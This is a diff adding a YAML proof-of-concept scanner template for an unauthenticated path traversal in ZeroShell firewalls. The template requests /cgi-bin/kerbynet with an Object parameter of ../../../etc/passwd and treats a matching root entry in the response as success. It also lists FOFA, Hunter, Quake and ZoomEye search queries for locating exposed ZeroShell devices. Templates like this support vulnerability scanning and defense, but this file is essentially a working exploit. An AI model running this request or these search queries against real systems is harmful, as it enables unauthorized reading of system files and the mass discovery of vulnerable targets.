@@ -1,0 +1,30 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Zeroshell-防火墙"
+    hunter-query: app.name=="ZeroShell"
+    quake-query: app:"zeroshell"
+    zoomeye-query: app:"ZeroShell"
+    threatbook-query: #
+    cve: 
+    cnvd:
+
+name: poc-yaml-zeroshell-Object-file-read
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd
+      follow_redirects: false
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+expression: r0() 
